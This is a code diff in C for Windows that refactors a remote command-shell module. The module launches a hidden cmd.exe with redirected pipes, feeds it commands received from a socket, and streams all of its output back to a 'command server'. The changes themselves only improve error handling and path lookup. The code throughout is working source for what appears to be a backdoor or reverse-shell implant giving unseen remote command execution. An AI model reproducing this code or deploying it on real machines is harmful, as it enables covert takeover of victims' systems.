@@ -10,9 +10,10 @@
 // Create a structure (and global instance of it) that holds all the globals used in this file
 // This helps organize the globals and make it more obvious where each global is coming from
 struct cmdGlobalsStruct {
-    HANDLE cmdOut;   // set by createCommandPrompt()
-    HANDLE cmdIn;    // set by createCommandPrompt()
-    SOCKET cmdSock;  // copied from socket passed to startCMD
+    HANDLE cmdOut;       // set by createCommandPrompt()
+    HANDLE cmdIn;        // set by createCommandPrompt()
+    SOCKET cmdSock;      // copied from socket passed to startCMD
+    HANDLE cmdOutThread; // set by startCMD
 } cmdGlobals;
 
 /*
@@ -23,35 +24,33 @@ struct cmdGlobalsStruct {
 * parameters:
 *	[in] sock - the socket to send the command prompt output to
 * returns:
-*	0 on success, otherwise returns the result of GetLastError()
+*	true on success, false on failure
+*   in the case of failure, the error is logged automatically
 */
-int startCMD(SOCKET sock) {
+BOOL startCMD(SOCKET sock) {
     // create the child process with I/O pipes
-    int retCode = createCommandPrompt();
-    if (retCode != 0) {
-        logMessage("Failed to start CMD\n");
-        return retCode;
+    BOOL bSuccess = createCommandPrompt();
+    if (!bSuccess) {
+        logMessage("Failed to spawn child command prompt process\n");
+        return FALSE;
     }
-    logMessage("CMD started\n");
-    // create the output thread
+    // set the command prompt output socket
     cmdGlobals.cmdSock = sock;
-    HANDLE thread;
-    DWORD threadID;
-    thread = CreateThread(
-        NULL, // default security attributes
-        0, // default stack size
+    // create the output thread
+    cmdGlobals.cmdOutThread = CreateThread(
+        NULL,            // default security attributes
+        0,               // default stack size
         cmdOutputThread, // run the cmdOutputThread function
-        NULL, // no parameters passed - the thread can access the globals
-        0, // thread creation flags
-        &threadID // output for the thread ID
+        NULL,            // no parameters passed - the thread can access the globals
+        0,               // thread creation flags
+        NULL        // output for the thread ID
     );
-    if (thread == NULL) {
+    if (cmdGlobals.cmdOutThread == NULL) {
         int err = GetLastError();
         logMessage("CreateThread failed with error %d\n", err);
-        return err;
-    } else {
-        logMessage("Thread started\n");
+        return FALSE;
     }
+    return TRUE;
 }
 
 /*
@@ -60,9 +59,10 @@ int startCMD(SOCKET sock) {
 * parameters:
 *	N/A
 * returns:
-*	0 on success, otherwise returns the result of GetLastError()
+*	true on success, false on failure
+*   in the case of failure, the error is logged automatically
 */
-int createCommandPrompt() {
+BOOL createCommandPrompt() {
     /*
     * First, create the I/O pipes
     */
@@ -76,25 +76,25 @@ int createCommandPrompt() {
     if (!CreatePipe(&cmdGlobals.cmdOut, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
         int err = GetLastError();
         logMessage("CreatePipe failed with error %d\n", err);
-        return err;
+        return FALSE;
     }
     // ensure the read handle to the pipe for STDOUT is not inherited
     if (!SetHandleInformation(cmdGlobals.cmdOut, HANDLE_FLAG_INHERIT, 0)) {
         int err = GetLastError();
         logMessage("SethandleInformation failed with error %d\n", err);
-        return err;
+        return FALSE;
     }
     // create a pipe for the child process's STDIN
     if (!CreatePipe(&g_hChildStd_IN_Rd, &cmdGlobals.cmdIn, &saAttr, 0)) {
         int err = GetLastError();
         logMessage("CreatePipe failed with error %d\n", err);
-        return err;
+        return FALSE;
     }
     // ensure the write handle to the pipe for STDIN is not inherited
     if (!SetHandleInformation(cmdGlobals.cmdIn, HANDLE_FLAG_INHERIT, 0)) {
         int err = GetLastError();
         logMessage("SethandleInformation failed with error %d\n", err);
-        return err;
+        return FALSE;
     }
     /*
     * Next, create the child process
@@ -111,23 +111,31 @@ int createCommandPrompt() {
     siStartInfo.hStdOutput = g_hChildStd_OUT_Wr; // redirect STD_OUT
     siStartInfo.hStdInput = g_hChildStd_IN_Rd; // redirect STD_IN
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES; // use the I/O redirections
+    // get the path to cmd.exe
+    char sysPath[MAX_PATH], cmdPath[MAX_PATH];
+    if(GetSystemDirectory(sysPath, MAX_PATH) == 0) {
+        int err = GetLastError();
+        logMessage("Failed to get system directory with error code: %d\n", err);
+        return FALSE;
+    }
+    sprintf(cmdPath, "%s\\cmd.exe", sysPath);
     // create the child process
     bSuccess = CreateProcess(
-        "C:\\Windows\\System32\\cmd.exe",             // application name
-        NULL,                  // command line
-        NULL,                  // process security attributes
-        NULL,                  // primary thread security attributes
-        TRUE,                  // handles are inherited
-        CREATE_NO_WINDOW,      // creation flags
-        NULL,                  // use parent's environment
-        NULL,                  // use parent's current directory
-        &siStartInfo,          // STARTUPINFO pointer
-        &piProcInfo);          // receives PROCESS_INFORMATION
+        cmdPath,          // application name
+        NULL,             // command line
+        NULL,             // process security attributes
+        NULL,             // primary thread security attributes
+        TRUE,             // handles are inherited
+        CREATE_NO_WINDOW, // creation flags
+        NULL,             // use parent's environment
+        NULL,             // use parent's current directory
+        &siStartInfo,     // STARTUPINFO pointer
+        &piProcInfo);     // receives PROCESS_INFORMATION
     // if an error occurs, return the error
     if (!bSuccess) {
         int err = GetLastError();
         logMessage("CreateProcess failed with error %d\n", err);
-        return err;
+        return FALSE;
     }
     else {
         // close handles to the child process and its primary thread
@@ -139,7 +147,7 @@ int createCommandPrompt() {
         CloseHandle(g_hChildStd_IN_Rd);
     }
     // return success
-    return 0;
+    return TRUE;
 }
 
 /*
@@ -150,16 +158,24 @@ int createCommandPrompt() {
 *	[in] buff - the buffer containing the input string
 *   [in] inputLen - the length of the input string
 * returns:
-*	0 on success, otherwise returns the result of GetLastError()
+*	true on success, false on failure
+*   in the case of failure, the error is logged automatically
 */
-int inputToCMD(char* buff, int inputLen) {
+BOOL inputToCMD(char* buff, int inputLen) {
     DWORD written;
-    BOOL success;
+    BOOL bSuccess;
     // TODO - loop this to make sure everything gets written
-    if(!WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL)) {
-        return GetLastError();
+    bSuccess = WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL);
+    if (!bSuccess) {
+        DWORD err = GetLastError();
+        if (err == ERROR_BROKEN_PIPE) {
+            logMessage("Command prompt closed. Cannot enter new commands\n");
+        } else {
+            logMessage("Failed to write input to command prompt with error code: %d\n", err);
+        }
+        return FALSE;
     }
-    return 0;
+    return TRUE;
 }
 
 /*
@@ -169,12 +185,12 @@ int inputToCMD(char* buff, int inputLen) {
 * parameters:
 *	[in] lpParam - thread parameters (this is unused since the thread can access the cmd globals struct)
 * returns:
-*	0 on successful exit, otherwise returns the last error code
+*	0 when exiting due to command prompt closing, otherwise returns the last error code
 */
 DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
     DWORD dwRead, dwWritten, dResult;
     CHAR chBuf[4096];
-    BOOL bSuccess = FALSE;
+    BOOL bSuccess;
 
     while (TRUE)
     {
@@ -184,18 +200,19 @@ DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
             DWORD err = GetLastError();
             if (err == ERROR_BROKEN_PIPE) {
                 logMessage("Command prompt closed. Stopping cmd output thread\n");
+                return 0;
             } else if (!bSuccess) {
-                logMessage("Readfile error in cmd output thread: %d\n", GetLastError());
+                logMessage("Readfile error in cmd output thread: %d\n", err);
             } else {
                 logMessage("Read 0 bytes from command prompt. Stopping cmd output thread\n");
             }
-            break;
+            return err;
         }
         // send the output to the command server
         dResult = send(cmdGlobals.cmdSock, chBuf, dwRead, 0);
         if (dResult == SOCKET_ERROR) {
             logMessage("Failed to send cmd output to command server with error code: %d\n", WSAGetLastError());
-            break;
+            return dResult;
         }
     }
 }
